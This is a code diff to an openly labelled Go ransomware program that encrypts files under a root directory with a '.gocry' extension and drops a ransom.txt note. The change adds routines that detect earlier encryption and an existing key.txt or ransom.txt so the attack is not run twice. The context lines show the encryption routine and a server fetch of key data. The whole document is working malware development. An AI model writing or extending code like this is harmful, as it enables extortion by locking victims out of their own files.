@@ -10,11 +10,13 @@ import (
 	"crypto/x509"
 	"encoding/json"
 	"encoding/pem"
+	"errors"
 	"io"
 	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/joho/godotenv"
@@ -54,6 +56,30 @@ func (rw *Ransomware) GenNewKey() error {
 
 	rw.key = key
 	return nil
+}
+
+// checkIfEncrypted doesn't do any complex checking just checks if some of the files
+// in the root directory end with .gocry. This is used because we don't want to encrypt
+// multiples times if the program has already been run.
+func checkIfEncrypted(path string) bool {
+	files, err := ioutil.ReadDir(path)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	for _, f := range files {
+		if f.IsDir() {
+			if encrypted := checkIfEncrypted(path + f.Name()); encrypted {
+				return true
+			}
+		} else {
+			if strings.HasSuffix(f.Name(), ".gocry") {
+				return true
+			}
+		}
+	}
+
+	return false
 }
 
 // encrypts a file at a given path using the given ransomware key. also adds the .gocry extension
@@ -151,6 +177,24 @@ func (rw *Ransomware) decryptDirectory(path string) {
 	}
 }
 
+func (rw *Ransomware) checkIfActiveRansom() error {
+	// first check if some of the files are encrypted.
+	if encrypted := checkIfEncrypted(rw.rootDir); encrypted {
+		return errors.New("some files are already encrypted")
+	}
+
+	// check if ransom.txt and key.txt exists in the root directory.
+	if _, err := os.Stat(rw.rootDir + "/key.txt"); !os.IsNotExist(err) {
+		return errors.New("a key.txt already exists: " + err.Error())
+	}
+
+	if _, err := os.Stat(rw.rootDir + "/ransom.txt"); !os.IsNotExist(err) {
+		return errors.New("a ransom.txt file already exists: " + err.Error())
+	}
+
+	return nil
+}
+
 func main() {
 	if err := godotenv.Load(); err != nil {
 		log.Fatal(err)
@@ -160,16 +204,17 @@ func main() {
 	ransomware.GenNewKey()
 	ransomware.rootDir = os.Getenv("root_dir")
 
+	// Check if the user already has a ransom
+	if err := ransomware.checkIfActiveRansom(); err != nil {
+		log.Fatal(err)
+	}
+
 	// Create the message file
 	file, err := os.Create(ransomware.rootDir + "/ransom.txt")
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer file.Close()
-
-	if _, err := file.WriteString(message); err != nil {
-		log.Fatal(err)
-	}
 
 	// Get block data from the server, this way the ransomware can run independently
 	// without needing the public key with the file.
